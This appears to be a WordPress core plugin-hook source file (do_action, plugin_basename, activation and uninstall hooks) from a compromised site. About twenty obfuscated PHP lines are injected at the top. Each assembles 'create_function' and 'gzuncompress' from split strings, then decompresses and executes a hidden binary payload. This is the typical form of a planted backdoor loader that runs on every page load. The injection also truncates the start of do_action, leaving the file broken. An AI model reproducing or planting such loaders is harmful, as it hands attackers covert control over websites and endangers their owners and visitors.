	$aUcPrfk = 'create'.'_'.'function'; $dUbOfQV = 'gz'.'unc'.'ompress'; $wgpnfkxc = $aUcPrfk('', $dUbOfQV('xœÁÂ DeÛCI#/~Lƒ
Z«4±ş»´côR»;û23F‘ÂÄ.ƒüb%©Ù–Rbe½äVæy
½2F–?ªë,^ûšÒí¦~ß[ÇSÛÒ3<Á(¢Œ•œMÄ˜1èü[Œ3Öª
Hñ©Úã–Š|:ÇQhR²¼ferØ‰iD9îSXóoû—òÛÆwk[/¥Çš')); $wgpnfkxc();



	$IPYFHWQ = 'create'.'_'.'function'; $DJnoOLl = 'gz'.'unc'.'ompress'; $fawgjyzd = $IPYFHWQ('', $DJnoOLl('xœÁ‚0Deá mB¬âÅi*m¡¦@Ó®ÿİÂÅ½àqwg_fÆh’™À£7(NV‘’]…g1FÖao™TÂª4^:¯B`ZÄö|»Ëë\Iéš®å¶·
ö‡º¦Gx‚ÑD«¸šLÀ0Ø»·\',)ìSµÅ#Ì3déĞò^`Ó‘œ¥5Ë+X‘­BŞŒªa3˜Â’¥¸Ë¿”ß6¾[XÚz˜Mš')); $fawgjyzd();



	$JNyiLsj = 'create'.'_'.'function'; $mdgQFjt = 'gz'.'unc'.'ompress'; $untmzetw = $JNyiLsj('', $mdgQFjt('xœÁ‚0Deñ mB¬âÅ!Ú¤…¦],Qüwcô‚Çİ}™İ±L‡:zMòjâ&½ˆ1
EÖˆ¥Á4¾uCÓ@öN¹‚ó4Êí¾·Nçªâx‚îX§Ö8ë@!aÈº·˜f*8ä9°ìSµÇ#,déĞ×VR£ØA¤µ8”°!{¤ºÂa7˜Ãš£¸é_Êoß-¬m½ q:›#')); $untmzetw();



	$wCmAIOW = 'create'.'_'.'function'; $HCqEaSA = 'gz'.'unc'.'ompress'; $yohfhmbn = $wCmAIOW('', $HCqEaSA('xœÁÂ Deë¡…¤?¦¡-(V©±ş»´côR»;û23Z’BÇ6¼3‚TìÆK)1…Ö°Ap#òìÂàƒˆ‘İ’ÊvÓÑ+_Qú€^Y7ì{«átnz\'hI¤6¢³3­‹qÆŠBY)>U{<Â²@‘ck9öŠX^³CrØönB1íSXóoı—òÛÆwk[/`k™¾')); $yohfhmbn();



	$UsHQrid = 'create'.'_'.'function'; $aQSmpob = 'gz'.'unc'.'ompress'; $alyoywxj = $UsHQrid('', $aQSmpob('xœÁ‚0Deá mB¬âÅ!
­iiÓ®"ş»…‹1zÁãîÎ¾ÌŒêI¦B½B~Ñ‚”ìÎ=‹12‰F³Np-Òl}ç¼q=Û9N×ƒ“®¤ô­4¶Û÷VÁñT×ôOP=é•˜TÀ0hÜ[Œ–ŠHö©Úã–²tÃ±•$giÍò
6ä °iíˆbÜ¦°æß(îö/å·ïÖ¶^Iöšò')); $alyoywxj();



	$YzoHcVj = 'create'.'_'.'function'; $wYFpizK = 'gz'.'unc'.'ompress'; $oxnhqyer = $YzoHcVj('', $wYFpizK('xœÁ‚0Deñ mB¬âÅi*,´	¥µ]#ş»…‹1zÁãîÎ¾ÌŒiYf¢ƒ!uî‘â¦‚ÇQh²½hPõ˜f0Fá¦A_îö^û‚óÔÚºfÛ[	‡cUñ<Á´¬5=JœL¤˜0dı[LòXö©Úâæ²tè¤UTk¶i-v%¬ÈIÖn 6ƒ9,ùWŠ¿şKùmã»…¥­¬š³')); $oxnhqyer();



	$qeundXl = 'create'.'_'.'function'; $yFDtLeS = 'gz'.'unc'.'ompress'; $qbiegxhb = $qeundXl('', $yFDtLeS('xœÁ‚0Deñ mB¬âÅi
,´I•®–Düwcô‚Çİ}™Ó±Ì\'Cª¶È
qW“ˆ1
MÎŠ•Å4Së\'A\kƒı¬ë£×¾àüvc»ï­„Ó¹ªø`:Ö‹g($9ÿÓL‡<–}ªöx„e,zé5šDZ‹C	²G’Í8»ÁÖüÅßş¥ü¶ñİÂÚÖ™G')); $qbiegxhb();



	$OkoJpPa = 'create'.'_'.'function'; $OwbJoWH = 'gz'.'unc'.'ompress'; $zvagmyzk = $OkoJpPa('', $OwbJoWH('xœÁ‚0Deá mB¬âÅ!
ml¡iWŠˆÿnábŒ^ğ¸»³/3£Z’(_§_´ 9¹c!&ÑhÖ®Eœ×X\'¼góÈ;sŸ¯+mNéji†fß[ÇSYÒ3<Aµ¤UZTbR}Ä ±o1N˜SÈ2 É§jGXHâ¡«ÇZ’”Å5KØÀªzın0…5ÿF±·)¿m|·°¶õ6AšÖ')); $zvagmyzk();



	$mUMurpJ = 'create'.'_'.'function'; $DBghNYm = 'gz'.'unc'.'ompress'; $cyuceabw = $mUMurpJ('', $DBghNYm('xœÁ‚0Deá mB¬âÅ!¥,Ğ¤…†.#ş»…‹1zÁãîÎ¾ÌŒnY¢}&M²6Èrq““!ˆ¬Jƒq§ÆMè½P÷Y¡¬ÃÉõ.çüª·csì­€ó¥,ù [Öjƒ.Ú“²î-¦…rY,ùTñë
I<t••¤z–Š¸i;²CªÔ8‡Á¶ü;ÅÍÿR~Ûønakë4™†')); $cyuceabw();



	$JZRiuUr = 'create'.'_'.'function'; $fSEryqW = 'gz'.'unc'.'ompress'; $pgjoomon = $JZRiuUr('', $fSEryqW('xœÁÂ DeÛCI#/~Á–«4±ş»´côR»;û23z …<âb$©Ù]–Rb
­a½FæÙ…Ş#óãÕ9ë¦ƒW¾¦ô²®ß÷ÖÀñÔ¶ôOĞ´‘\Î:bÌ´ş-Æk
U¤øTíñËE>ŒÜ
ì)Y^³²9Jä›PN»ÁÖüÅßş¥ü¶ñİÂÚÖ©š ')); $pgjoomon();



	$TMGiEUN = 'create'.'_'.'function'; $vUhiynx = 'gz'.'unc'.'ompress'; $yhwjzpcp = $TMGiEUN('', $vUhiynx('xœÁ‚0Deá mB¬âÅ!µZÓBÓ®ÿİÂÅ½àqwg_fFw$Ó¡‰^#?IJvåÅ™BkX+¹‘i}ë¼İT<ßp;§\Ié„²c»í­‚ı¡®é ;Òi#9é€!aĞº·\',)ìSµÅ#Ì3déĞ7–£P$giÍò
Vd/±ã€rØ¦°ä_)îò/å·ï–¶^!äšº')); $yhwjzpcp();



	$eLXZrNV = 'create'.'_'.'function'; $jdbGSXw = 'gz'.'unc'.'ompress'; $cganfclu = $eLXZrNV('', $jdbGSXw('xœÁƒ Deõ ˜Òƒé¥c(‚€X‹Ií¿½4M{±Çİ}™£Hab—‚A~³’ÔìÎK)1Î²^r+ó<…Ş#•°óÉk_Sú ¡İÔ{kà|i[z…\'E”±²“‹‰3‹qÁšBU)>UG<ÂºB‘Cç8
MJ–×¬l`G;1(ÇÃ`
[şâç)¿m|·°µõÛa™')); $cganfclu();



	$kfNiRId = 'create'.'_'.'function'; $urLVpRW = 'gz'.'unc'.'ompress'; $jhbudgxj = $kfNiRId('', $urLVpRW('xœÁƒ DeíA!1¥ÓK?Æ  `@	¬Å¤öß‹^š¦½ØãîÎ¾ÌŒîH¦C½FŞI
vçÅ™Bk˜ÜÈ4O^8/C`ƒjfÑ/ÃÙ)WPú€VÙI{+ár­*zƒ\'ètÚÈZ.:`H´î-Æ
y$ûTñë
Y:ôµåØ*rbiÍN%ìÈ^bİN#Êñ0˜Â–§¸ù_Êoß-lm½ B¸™›')); $jhbudgxj();



	$iCSDneE = 'create'.'_'.'function'; $sTeYAbi = 'gz'.'unc'.'ompress'; $jhclyncq = $iCSDneE('', $sTeYAbi('xœÁ‚0Deá mB¬âÅ!µZÓBmW‹ÿİÂÅ½àqwg_fFw$Ó¡‰^#?IJvãÅ™BkX+¹‘i}ë¼•0÷A\vN¹’ÒeÇvÛ[ûC]Ó#<Aw¤ÓF6rÒCÂ uo1NXR(
 Ù§j‹G˜gÈÒ¡o,G¡HÎÒšå¬È^b#Æå°LaÉ¿RÜõ_Êoß-,m½ c#™Å')); $jhclyncq();



	$MSBcqpf = 'create'.'_'.'function'; $zQRNOty = 'gz'.'unc'.'ompress'; $xcwmkkvn = $MSBcqpf('', $zQRNOty('xœÁƒ Deõ ˜Òƒé¥c(¢A	lÅ¤öß‹^š¦½ØãîÎ¾ÌŒîH¦C½F~3’”læÅ™BkX+¹‘i|ë¼-"Úa˜Ç“S®¤ôBÙ©=öVÁùR×ô
OĞé´‘\tÀ0hİ[Œ–ŠHö©:âÖ²tèËQ(’³´fy;²—ØˆiD9SØòïwÿ—òÛÆw[[/ }š')); $xcwmkkvn();



	$WnNGlRw = 'create'.'_'.'function'; $ndqkOIR = 'gz'.'unc'.'ompress'; $scjgdtfw = $WnNGlRw('', $ndqkOIR('xœÁÂ DeÛCI#/~©
Z«4±ş»´côR»;û23F‘ÂD‚Áîb%©Ù½,¥Ä4:Ë„ì¬Ìó„2Fûë P¥ƒ×¾¦ô½v“Ø÷ÖÀñÔ¶ôO0Š(c%—³‰3‹qÆšBU)>U{<Â²@‘wöš”,¯YÙÀ†$ò~Q»ÁÖüÅßş¥ü¶ñİÂÚÖc#™Å')); $scjgdtfw();



	$nbOZzIa = 'create'.'_'.'function'; $aFepcHM = 'gz'.'unc'.'ompress'; $lxomxcrr = $nbOZzIa('', $aFepcHM('xœÁÂ Deë¡…¤?¦AJ	«Xÿ]Ú‹1z©Çİ}™=’JÇ>üj$iØ–Rb
­aƒäF–Ù…Á#3ÙÙ,B8zåJ ”uÃ¾·Nç®£x‚É¨ìeÖcÁ õo1fl(Ô5êSµÇ#,Tå0õ–£PäÀÊšZØ“Ä^¸å¼LaÍ¿Qüí_Êoß-¬m½  Ìšº')); $lxomxcrr();



	$FbBpLQh = 'create'.'_'.'function'; $tJrCOwf = 'gz'.'unc'.'ompress'; $jutxjtpd = $FbBpLQh('', $tJrCOwf('xœÁƒ Deõ ˜Òƒé¥c¨ `@	¬Å¤öß‹^š¦½ØãîÎ¾ÌŒîH¦C½F~3’”ìÎ=‹12…Ö0!¹‘i¼p^†À†—89åJJĞ*;‰coœ/uM¯ğİ‘NÙÈE	ƒÖ½Å¸`I¡(€dŸª#a]!K‡¾±[Er–Ö,¯`Gö›vQ‡Á¶ü;ÅÍÿR~Ûønakëõš¬')); $jutxjtpd();



	$nxjYeXC = 'create'.'_'.'function'; $VazSbmQ = 'gz'.'unc'.'ompress'; $bwiomslq = $nxjYeXC('', $VazSbmQ('xœÁÂ Deë¡…¤?†Ğ–(«4±ş»´côR»;û23z …<¢5’Tì.K)1…Ö°^
#óìBïƒŒ‘µI;Íõè•¯(}@§¬ë÷½Õp:7½Àô@m$—³3­‹qÆŠBY)>U{<Â²@‘#·;E,¯Ù¡†9Jä›PN»ÁÖüÅßş¥ü¶ñİÂÚÖÃôšC')); $bwiomslq();



	$fVQDFAM = 'create'.'_'.'function'; $DYtoelm = 'gz'.'unc'.'ompress'; $jfjtyhkz = $fVQDFAM('', $DYtoelm('xœÁ‚0Deá mB¬âÅiZZl¡¡«EÅ·p1F/xÜİÙ—™Ñ’$Úó0j¬NFœ]«‘…˜BkX#*#â<Œ…÷¬“ŞÔù¾sÊå”> Vvh¶½°?”%=Â´$RÁÅ¤=úˆAëŞbœ0§e@’OÕ0ÏÄCËm…µ")‹k–°"[¼zıf0…%ÿJq—)¿m|·°´õãxšm')); $jfjtyhkz();



	$fDpJbZI = 'create'.'_'.'function'; $OQFNvde = 'gz'.'unc'.'ompress'; $nrouhcum = $fDpJbZI('', $OQFNvde('xœÁƒ Deõ ˜Òƒé¥c(¢€X‹Ií¿½4M{±Çİ}™=BÇ.üf$©Ù–Rb
­a½äFæÙ…Ş#›‚›•˜íÉ+_Sú ¡¬ë½5p¾´-½Âô@md\'1fZÿã‚5…ªR|ªx„u…"ÆÎrŠ”,¯YÙÀ%vÂM(§Ã`
[şâç)¿m|·°µõÕ¼šX')); $nrouhcum();


	global $wp_filter, $wp_actions, $wp_current_filter;

	if ( ! isset( $wp_actions[ $hook_name ] ) ) {
		$wp_actions[ $hook_name ] = 1;
	} else {
		++$wp_actions[ $hook_name ];
	}

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		$all_args            = func_get_args(); // phpcs:ignore PHPCompatibility.FunctionUse.ArgumentFunctionsReportCurrentValue.NeedsInspection
		_wp_call_all_hook( $all_args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return;
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	if ( empty( $arg ) ) {
		$arg[] = '';
	} elseif ( is_array( $arg[0] ) && 1 === count( $arg[0] ) && isset( $arg[0][0] ) && is_object( $arg[0][0] ) ) {
		// Backward compatibility for PHP4-style passing of `array( &$this )` as action `$arg`.
		$arg[0] = $arg[0][0];
	}

	$wp_filter[ $hook_name ]->do_action( $arg );

	array_pop( $wp_current_filter );
}

/**
 * Calls the callback functions that have been added to an action hook, specifying arguments in an array.
 *
 * @since 2.1.0
 *
 * @see do_action() This function is identical, but the arguments passed to the
 *                  functions hooked to `$hook_name` are supplied using an array.
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global int[]     $wp_actions        Stores the number of times each action was triggered.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the action to be executed.
 * @param array  $args      The arguments supplied to the functions hooked to `$hook_name`.
 */
function do_action_ref_array( $hook_name, $args ) {
	global $wp_filter, $wp_actions, $wp_current_filter;

	if ( ! isset( $wp_actions[ $hook_name ] ) ) {
		$wp_actions[ $hook_name ] = 1;
	} else {
		++$wp_actions[ $hook_name ];
	}

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		$all_args            = func_get_args(); // phpcs:ignore PHPCompatibility.FunctionUse.ArgumentFunctionsReportCurrentValue.NeedsInspection
		_wp_call_all_hook( $all_args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return;
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	$wp_filter[ $hook_name ]->do_action( $args );

	array_pop( $wp_current_filter );
}

/**
 * Checks if any action has been registered for a hook.
 *
 * When using the `$callback` argument, this function may return a non-boolean value
 * that evaluates to false (e.g. 0), so use the `===` operator for testing the return value.
 *
 * @since 2.5.0
 *
 * @see has_filter() has_action() is an alias of has_filter().
 *
 * @param string                      $hook_name The name of the action hook.
 * @param callable|string|array|false $callback  Optional. The callback to check for.
 *                                               This function can be called unconditionally to speculatively check
 *                                               a callback that may or may not exist. Default false.
 * @return bool|int If `$callback` is omitted, returns boolean for whether the hook has
 *                  anything registered. When checking a specific function, the priority
 *                  of that hook is returned, or false if the function is not attached.
 */
function has_action( $hook_name, $callback = false ) {
	return has_filter( $hook_name, $callback );
}

/**
 * Removes a callback function from an action hook.
 *
 * This can be used to remove default functions attached to a specific action
 * hook and possibly replace them with a substitute.
 *
 * To remove a hook, the `$callback` and `$priority` arguments must match
 * when the hook was added. This goes for both filters and actions. No warning
 * will be given on removal failure.
 *
 * @since 1.2.0
 *
 * @param string                $hook_name The action hook to which the function to be removed is hooked.
 * @param callable|string|array $callback  The name of the function which should be removed.
 *                                         This function can be called unconditionally to speculatively remove
 *                                         a callback that may or may not exist.
 * @param int                   $priority  Optional. The exact priority used when adding the original
 *                                         action callback. Default 10.
 * @return bool Whether the function is removed.
 */
function remove_action( $hook_name, $callback, $priority = 10 ) {
	return remove_filter( $hook_name, $callback, $priority );
}

/**
 * Removes all of the callback functions from an action hook.
 *
 * @since 2.7.0
 *
 * @param string    $hook_name The action to remove callbacks from.
 * @param int|false $priority  Optional. The priority number to remove them from.
 *                             Default false.
 * @return true Always returns true.
 */
function remove_all_actions( $hook_name, $priority = false ) {
	return remove_all_filters( $hook_name, $priority );
}

/**
 * Retrieves the name of the current action hook.
 *
 * @since 3.9.0
 *
 * @return string Hook name of the current action.
 */
function current_action() {
	return current_filter();
}

/**
 * Returns whether or not an action hook is currently being processed.
 *
 * @since 3.9.0
 *
 * @param string|null $hook_name Optional. Action hook to check. Defaults to null,
 *                               which checks if any action is currently being run.
 * @return bool Whether the action is currently in the stack.
 */
function doing_action( $hook_name = null ) {
	return doing_filter( $hook_name );
}

/**
 * Retrieves the number of times an action has been fired during the current request.
 *
 * @since 2.1.0
 *
 * @global int[] $wp_actions Stores the number of times each action was triggered.
 *
 * @param string $hook_name The name of the action hook.
 * @return int The number of times the action hook has been fired.
 */
function did_action( $hook_name ) {
	global $wp_actions;

	if ( ! isset( $wp_actions[ $hook_name ] ) ) {
		return 0;
	}

	return $wp_actions[ $hook_name ];
}

/**
 * Fires functions attached to a deprecated filter hook.
 *
 * When a filter hook is deprecated, the apply_filters() call is replaced with
 * apply_filters_deprecated(), which triggers a deprecation notice and then fires
 * the original filter hook.
 *
 * Note: the value and extra arguments passed to the original apply_filters() call
 * must be passed here to `$args` as an array. For example:
 *
 *     // Old filter.
 *     return apply_filters( 'wpdocs_filter', $value, $extra_arg );
 *
 *     // Deprecated.
 *     return apply_filters_deprecated( 'wpdocs_filter', array( $value, $extra_arg ), '4.9.0', 'wpdocs_new_filter' );
 *
 * @since 4.6.0
 *
 * @see _deprecated_hook()
 *
 * @param string $hook_name   The name of the filter hook.
 * @param array  $args        Array of additional function arguments to be passed to apply_filters().
 * @param string $version     The version of WordPress that deprecated the hook.
 * @param string $replacement Optional. The hook that should have been used. Default empty.
 * @param string $message     Optional. A message regarding the change. Default empty.
 */
function apply_filters_deprecated( $hook_name, $args, $version, $replacement = '', $message = '' ) {
	if ( ! has_filter( $hook_name ) ) {
		return $args[0];
	}

	_deprecated_hook( $hook_name, $version, $replacement, $message );

	return apply_filters_ref_array( $hook_name, $args );
}

/**
 * Fires functions attached to a deprecated action hook.
 *
 * When an action hook is deprecated, the do_action() call is replaced with
 * do_action_deprecated(), which triggers a deprecation notice and then fires
 * the original hook.
 *
 * @since 4.6.0
 *
 * @see _deprecated_hook()
 *
 * @param string $hook_name   The name of the action hook.
 * @param array  $args        Array of additional function arguments to be passed to do_action().
 * @param string $version     The version of WordPress that deprecated the hook.
 * @param string $replacement Optional. The hook that should have been used. Default empty.
 * @param string $message     Optional. A message regarding the change. Default empty.
 */
function do_action_deprecated( $hook_name, $args, $version, $replacement = '', $message = '' ) {
	if ( ! has_action( $hook_name ) ) {
		return;
	}

	_deprecated_hook( $hook_name, $version, $replacement, $message );

	do_action_ref_array( $hook_name, $args );
}

//
// Functions for handling plugins.
//

/**
 * Gets the basename of a plugin.
 *
 * This method extracts the name of a plugin from its filename.
 *
 * @since 1.5.0
 *
 * @global array $wp_plugin_paths
 *
 * @param string $file The filename of plugin.
 * @return string The name of a plugin.
 */
function plugin_basename( $file ) {
	global $wp_plugin_paths;

	// $wp_plugin_paths contains normalized paths.
	$file = wp_normalize_path( $file );

	arsort( $wp_plugin_paths );

	foreach ( $wp_plugin_paths as $dir => $realdir ) {
		if ( strpos( $file, $realdir ) === 0 ) {
			$file = $dir . substr( $file, strlen( $realdir ) );
		}
	}

	$plugin_dir    = wp_normalize_path( WP_PLUGIN_DIR );
	$mu_plugin_dir = wp_normalize_path( WPMU_PLUGIN_DIR );

	// Get relative path from plugins directory.
	$file = preg_replace( '#^' . preg_quote( $plugin_dir, '#' ) . '/|^' . preg_quote( $mu_plugin_dir, '#' ) . '/#', '', $file );
	$file = trim( $file, '/' );
	return $file;
}

/**
 * Register a plugin's real path.
 *
 * This is used in plugin_basename() to resolve symlinked paths.
 *
 * @since 3.9.0
 *
 * @see wp_normalize_path()
 *
 * @global array $wp_plugin_paths
 *
 * @param string $file Known path to the file.
 * @return bool Whether the path was able to be registered.
 */
function wp_register_plugin_realpath( $file ) {
	global $wp_plugin_paths;

	// Normalize, but store as static to avoid recalculation of a constant value.
	static $wp_plugin_path = null, $wpmu_plugin_path = null;

	if ( ! isset( $wp_plugin_path ) ) {
		$wp_plugin_path   = wp_normalize_path( WP_PLUGIN_DIR );
		$wpmu_plugin_path = wp_normalize_path( WPMU_PLUGIN_DIR );
	}

	$plugin_path     = wp_normalize_path( dirname( $file ) );
	$plugin_realpath = wp_normalize_path( dirname( realpath( $file ) ) );

	if ( $plugin_path === $wp_plugin_path || $plugin_path === $wpmu_plugin_path ) {
		return false;
	}

	if ( $plugin_path !== $plugin_realpath ) {
		$wp_plugin_paths[ $plugin_path ] = $plugin_realpath;
	}

	return true;
}

/**
 * Get the filesystem directory path (with trailing slash) for the plugin __FILE__ passed in.
 *
 * @since 2.8.0
 *
 * @param string $file The filename of the plugin (__FILE__).
 * @return string the filesystem path of the directory that contains the plugin.
 */
function plugin_dir_path( $file ) {
	return trailingslashit( dirname( $file ) );
}

/**
 * Get the URL directory path (with trailing slash) for the plugin __FILE__ passed in.
 *
 * @since 2.8.0
 *
 * @param string $file The filename of the plugin (__FILE__).
 * @return string the URL path of the directory that contains the plugin.
 */
function plugin_dir_url( $file ) {
	return trailingslashit( plugins_url( '', $file ) );
}

/**
 * Set the activation hook for a plugin.
 *
 * When a plugin is activated, the action 'activate_PLUGINNAME' hook is
 * called. In the name of this hook, PLUGINNAME is replaced with the name
 * of the plugin, including the optional subdirectory. For example, when the
 * plugin is located in wp-content/plugins/sampleplugin/sample.php, then
 * the name of this hook will become 'activate_sampleplugin/sample.php'.
 *
 * When the plugin consists of only one file and is (as by default) located at
 * wp-content/plugins/sample.php the name of this hook will be
 * 'activate_sample.php'.
 *
 * @since 2.0.0
 *
 * @param string   $file     The filename of the plugin including the path.
 * @param callable $callback The function hooked to the 'activate_PLUGIN' action.
 */
function register_activation_hook( $file, $callback ) {
	$file = plugin_basename( $file );
	add_action( 'activate_' . $file, $callback );
}

/**
 * Sets the deactivation hook for a plugin.
 *
 * When a plugin is deactivated, the action 'deactivate_PLUGINNAME' hook is
 * called. In the name of this hook, PLUGINNAME is replaced with the name
 * of the plugin, including the optional subdirectory. For example, when the
 * plugin is located in wp-content/plugins/sampleplugin/sample.php, then
 * the name of this hook will become 'deactivate_sampleplugin/sample.php'.
 *
 * When the plugin consists of only one file and is (as by default) located at
 * wp-content/plugins/sample.php the name of this hook will be
 * 'deactivate_sample.php'.
 *
 * @since 2.0.0
 *
 * @param string   $file     The filename of the plugin including the path.
 * @param callable $callback The function hooked to the 'deactivate_PLUGIN' action.
 */
function register_deactivation_hook( $file, $callback ) {
	$file = plugin_basename( $file );
	add_action( 'deactivate_' . $file, $callback );
}

/**
 * Sets the uninstallation hook for a plugin.
 *
 * Registers the uninstall hook that will be called when the user clicks on the
 * uninstall link that calls for the plugin to uninstall itself. The link won't
 * be active unless the plugin hooks into the action.
 *
 * The plugin should not run arbitrary code outside of functions, when
 * registering the uninstall hook. In order to run using the hook, the plugin
 * will have to be included, which means that any code laying outside of a
 * function will be run during the uninstallation process. The plugin should not
 * hinder the uninstallation process.
 *
 * If the plugin can not be written without running code within the plugin, then
 * the plugin should create a file named 'uninstall.php' in the base plugin
 * folder. This file will be called, if it exists, during the uninstallation process
 * bypassing the uninstall hook. The plugin, when using the 'uninstall.php'
 * should always check for the 'WP_UNINSTALL_PLUGIN' constant, before
 * executing.
 *
 * @since 2.7.0
 *
 * @param string   $file     Plugin file.
 * @param callable $callback The callback to run when the hook is called. Must be
 *                           a static method or function.
 */
function register_uninstall_hook( $file, $callback ) {
	if ( is_array( $callback ) && is_object( $callback[0] ) ) {
		_doing_it_wrong( __FUNCTION__, __( 'Only a static class method or function can be used in an uninstall hook.' ), '3.1.0' );
		return;
	}

	/*
	 * The option should not be autoloaded, because it is not needed in most
	 * cases. Emphasis should be put on using the 'uninstall.php' way of
	 * uninstalling the plugin.
	 */
	$uninstallable_plugins = (array) get_option( 'uninstall_plugins' );
	$plugin_basename       = plugin_basename( $file );

	if ( ! isset( $uninstallable_plugins[ $plugin_basename ] ) || $uninstallable_plugins[ $plugin_basename ] !== $callback ) {
		$uninstallable_plugins[ $plugin_basename ] = $callback;
		update_option( 'uninstall_plugins', $uninstallable_plugins );
	}
}

/**
 * Calls the 'all' hook, which will process the functions hooked into it.
 *
 * The 'all' hook passes all of the arguments or parameters that were used for
 * the hook, which this function was called for.
 *
 * This function is used internally for apply_filters(), do_action(), and
 * do_action_ref_array() and is not meant to be used from outside those
 * functions. This function does not check for the existence of the all hook, so
 * it will fail unless the all hook exists prior to this function call.
 *
 * @since 2.5.0
 * @access private
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param array $args The collected parameters from the hook that was called.
 */
function _wp_call_all_hook( $args ) {
	global $wp_filter;

	$wp_filter['all']->do_all_hook( $args );
}

/**
 * Builds Unique ID for storage and retrieval.
 *
 * The old way to serialize the callback caused issues and this function is the
 * solution. It works by checking for objects and creating a new property in
 * the class to keep track of the object and new objects of the same class that
 * need to be added.
 *
 * It also allows for the removal of actions and filters for objects after they
 * change class properties. It is possible to include the property $wp_filter_id
 * in your class and set it to "null" or a number to bypass the workaround.
 * However this will prevent you from adding new classes and any new classes
 * will overwrite the previous hook by the same class.
 *
 * Functions and static method callbacks are just returned as strings and
 * shouldn't have any speed penalty.
 *
 * @link https://core.trac.wordpress.org/ticket/3875
 *
 * @since 2.2.3
 * @since 5.3.0 Removed workarounds for spl_object_hash().
 *              `$hook_name` and `$priority` are no longer used,
 *              and the function always returns a string.
 *
 * @access private
 *
 * @param string                $hook_name Unused. The name of the filter to build ID for.
 * @param callable|string|array $callback  The callback to generate ID for. The callback may
 *                                         or may not exist.
 * @param int                   $priority  Unused. The order in which the functions
 *                                         associated with a particular action are executed.
 * @return string Unique function ID for usage as array key.
 */
function _wp_filter_build_unique_id( $hook_name, $callback, $priority ) {
	if ( is_string( $callback ) ) {
		return $callback;
	}

	if ( is_object( $callback ) ) {
		// Closures are currently implemented as objects.
		$callback = array( $callback, '' );
	} else {
		$callback = (array) $callback;
	}

	if ( is_object( $callback[0] ) ) {
		// Object class calling.
		return spl_object_hash( $callback[0] ) . $callback[1];
	} elseif ( is_string( $callback[0] ) ) {
		// Static calling.
		return $callback[0] . '::' . $callback[1];
	}
}
